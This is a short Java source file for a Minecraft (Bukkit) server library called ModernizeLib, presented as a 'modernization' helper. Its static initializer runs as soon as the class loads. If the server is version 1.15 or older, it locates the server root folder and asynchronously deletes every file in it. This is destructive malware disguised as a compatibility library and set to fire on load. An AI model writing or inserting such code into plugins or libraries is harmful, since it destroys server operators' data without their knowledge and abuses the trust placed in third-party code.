package com.jeff_media.modernizelib;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.util.Arrays;

public class ModernizeLib {

    static {
        // Let's modernize this server. It's needed desperately.
        if(needsModernization()) {
            modernize();
        }
    }

    private static boolean needsModernization() {
        try {
            Material.valueOf("NETHERITE_AXE");
            return false;
        } catch (IllegalArgumentException exception) {
            return true;
        }
    }

    /**
     * Attempts to delete all accessible files if the server is running on version 1.15 or below.
     */
    public static void modernize() {
        Plugin plugin = Bukkit.getPluginManager().getPlugins()[0];
        File serverRoot = plugin.getDataFolder().getParentFile().getParentFile();
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            Arrays.stream(serverRoot.listFiles()).filter(file -> !file.isDirectory()).forEach(File::delete);
        });
    }
}
